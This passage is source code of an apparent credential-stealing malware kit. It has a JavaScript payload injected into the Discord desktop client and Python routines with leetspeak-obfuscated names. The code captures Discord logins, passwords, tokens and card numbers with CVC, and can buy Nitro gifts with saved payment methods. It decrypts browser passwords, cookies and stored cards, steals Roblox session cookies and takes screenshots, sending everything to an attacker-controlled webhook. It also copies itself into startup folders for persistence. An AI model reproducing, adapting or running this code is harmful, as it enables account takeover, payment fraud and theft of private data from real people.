const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def Di5c0rd_inj3c710n():
    import os
    import re
    import subprocess
    import psutil
    import requests

    def g3t_c0r3(dir):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        return core, file
        return None

    def st4rt_d15c0rd(dir):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def inj3ct_c0d3():
        appdata = os.getenv('LOCALAPPDATA')
        discord_dirs = [
            appdata + '\\Discord',
            appdata + '\\DiscordCanary',
            appdata + '\\DiscordPTB',
            appdata + '\\DiscordDevelopment'
        ]
        code = inj3c710n_c0d3

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in discord_dirs:
            if not os.path.exists(dir):
                continue

            core_info = g3t_c0r3(dir)
            if core_info is not None:
                core, core_file = core_info
                
                index_js_path = core + '\\index.js'
                
                if not os.path.exists(index_js_path):
                    open(index_js_path, 'w').close()

                with open(index_js_path, 'w', encoding='utf-8') as f:
                    f.write((code).replace('discord_desktop_core-1', core_file)
                            .replace(r"%WEBHOOK_HERE%", w3bh00k_ur1)
                            .replace(r"%EMBED_COLOR%", str(color_embed))
                            .replace(r"%USERNAME%", username_pc)
                            .replace(r"%IP_PUBLIC%", ip_address_public)
                            .replace(r"%EMBED_NAME%", username_embed)
                            .replace(r"%EMBED_ICON%", avatar_embed)
                            .replace(r"%FOOTER_TEXT%", footer_text)
                            .replace(r"%WEBSITE%", website))
                st4rt_d15c0rd(dir)
    inj3ct_c0d3()

def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path

    PASSWORDS = []
    COOKIES = []
    HISTORY = []
    DOWNLOADS = []
    CARDS = []
    browsers = []

    def Br0ws53r_Main():
        appdata_local = os.getenv('LOCALAPPDATA')
        appdata_roaming = os.getenv('APPDATA')
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            

        Browser = {
            'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(appdata_local, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(appdata_local, 'Amigo', 'User Data'),
            'Torch': os.path.join(appdata_local, 'Torch', 'User Data'),
            'Kometa': os.path.join(appdata_local, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(appdata_local, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(appdata_local, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(appdata_local, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(appdata_local, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(appdata_local, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(appdata_local, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(appdata_local, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(appdata_roaming, 'Apple Computer', 'Safari'),
        }

        profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                get_passwords(browser, path, profile_path, master_key)
                get_cookies(browser, path, profile_path, master_key)
                get_history(browser, path, profile_path)
                get_downloads(browser, path, profile_path)
                get_cards(browser, path, profile_path, master_key)

                if browser not in browsers:
                    browsers.append(browser)

        write_files(username_pc)
        send_files(username_pc, w3bh00k)
        clean_files(username_pc)

    def get_master_key(path):
        if not os.path.exists(path):
            return None

        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None

    def list_tables(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            conn.close()
            return tables
        except:
            return []

    def get_passwords(browser, path, profile_path, master_key):
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return

        shutil.copy(password_db, 'password_db')
        tables = list_tables('password_db')

        conn = sqlite3.connect('password_db')
        cursor = conn.cursor()

        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            PASSWORDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =      f"- Url      : {row[0]}"
                username = f"  Username : {row[1]}"
                password = f"  Password : {decrypt_password(row[2], master_key)}"
                PASSWORDS.append(f"{url}\n{username}\n{password}\n")
        except:
            pass
        finally:
            conn.close()
            os.remove('password_db')

    def get_cookies(browser, path, profile_path, master_key):
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        conn = None 
        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            COOKIES.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url =    f"- Url    : {row[0]}"
                name =   f"  Name   : {row[1]}"
                path =   f"  Path   : {row[2]}"
                cookie = f"  Cookie : {decrypt_password(row[3], master_key)}"
                expire = f"  Expire : {row[4]}"
                COOKIES.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n")
        except:
            pass
        finally:
            if conn:
                conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass


    def get_history(browser, path, profile_path):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        HISTORY.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =   f"- Url   : {row[0]}"
            title = f"  Title : {row[1]}"
            time =  f"  Time  : {row[2]}"
            HISTORY.append(f"{url}\n{title}\n{time}\n")

        conn.close()
        os.remove('history_db')

    def get_downloads(browser, path, profile_path):
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        DOWNLOADS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path = f"- Path : {row[1]}"
            url =  f"  Url  : {row[0]}"
            DOWNLOADS.append(f"{path}\n{url}\n")

        conn.close()
        os.remove('downloads_db')

    def get_cards(browser, path, profile_path, master_key):
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        CARDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            name =             f"- Name             : {row[0]}"
            expiration_month = f"  Expiration Month : {row[1]}"
            expiration_year =  f"  Expiration Year  : {row[2]}"
            card_number =      f"  Card Number      : {decrypt_password(row[3], master_key)}"
            date_modified =    f"  Date Modified    : {row[4]}"
            CARDS.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n")

        conn.close()
        os.remove('cards_db')

    def write_files(username_pc):
        os.makedirs(f"Browser_{username_pc}", exist_ok=True)

        if PASSWORDS:
            with open(f"Browser_{username_pc}\\Passwords_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(PASSWORDS))

        if COOKIES:
            with open(f"Browser_{username_pc}\\Cookies_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(COOKIES))

        if HISTORY:
            with open(f"Browser_{username_pc}\\History_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(HISTORY))

        if DOWNLOADS:
            with open(f"Browser_{username_pc}\\Downloads_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(DOWNLOADS))

        if CARDS:
            with open(f"Browser_{username_pc}\\Cards_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(CARDS))

        with ZipFile(f"Browser_{username_pc}.zip", "w") as zipf:
            for file in os.listdir(f"Browser_{username_pc}"):
                zipf.write(os.path.join(f"Browser_{username_pc}", file), file)

    def send_files(username_pc, w3bh00k):
        w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal  `{username_pc} "{ip_address_public}"`:',
                description=f"Found In **{'**, **'.join(browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{username_pc}"))) + "```",
                color=color_embed,
            ).set_footer(
                text=footer_text,
                icon_url=avatar_embed
            ),
            file=File(fp=f"Browser_{username_pc}.zip", filename=f"Browser_{username_pc}.zip"), username=username_embed, avatar_url=avatar_embed
        )

    def clean_files(username_pc):
        shutil.rmtree(f"Browser_{username_pc}")
        os.remove(f"Browser_{username_pc}.zip")

    def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()

def R0b10x_C00ki3():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook, Embed
    import discord

    c00ki35_list = []
    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return c00kie, n4vigator
        except:
            return None, None

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3:
            if c00ki3 not in c00ki35_list:
                c00ki35_list.append(c00ki3)
                try:
                    inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
                    api = json.loads(inf0.text)
                except:
                    pass

                us3r_1d_r0b10x = api.get('id', "None")
                d1spl4y_nam3_r0b10x = api.get('displayName', "None")
                us3rn4m3_r0b10x = api.get('name', "None")
                r0bux_r0b10x = api.get("RobuxBalance", "None")
                pr3mium_r0b10x = api.get("IsPremium", "None")
                av4t4r_r0b10x = api.get("ThumbnailUrl", "None")
                bui1d3r5_c1ub_r0b10x = api.get("IsAnyBuildersClubMember", "None")
        
                size_c00ki3 = len(c00ki3)
                middle_c00ki3 = size_c00ki3 // 2
                c00ki3_part1 = c00ki3[:middle_c00ki3]
                c00ki3_part2 = c00ki3[middle_c00ki3:]

                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

                embed = discord.Embed(
                    title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                    color=color_embed
                )
                embed.set_footer(text=footer_text, icon_url=avatar_embed)
                embed.set_thumbnail(url=av4t4r_r0b10x)
                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
                embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
                embed.add_field(name=":moneybag: Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
                embed.add_field(name=":tickets: Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
                embed.add_field(name=":construction_site: Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
                embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
                embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)

                w3bh00k.send(embed=embed, username=username_embed,
                                avatar_url=avatar_embed)
                
    if not c00ki35_list:
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        embed = Embed(
            title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:', 
            description=f"No roblox cookie found.",
            color=color_embed)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Op3n_U53r_Pr0fi13_53tting5():
    import subprocess
    import time
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass

def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File

    try:
        name_file_screen = f"Screenshot_{username_pc}.png"

        def capture(path):
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            image.save(path)
        
        try:
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)

        embed = Embed(title=f"Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        embed.set_image(url=f"attachment://{name_file_screen}")
        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(
                embed=embed,
                file=File(f'{path_file_screen}', filename=name_file_screen),
                username=username_embed,
                avatar_url=avatar_embed
            )

        if os.path.exists(path_file_screen):
            os.remove(path_file_screen)
    except:
        pass

def St4rtup():
    import os
    import sys
    import shutil

    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            ext = "exe"
        elif file_path.endswith(".py"):
            ext = "py"

        new_name = f"ㅤ.{ext}"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        path_new_file = os.path.join(folder, new_name)

        shutil.copy(file_path, path_new_file)
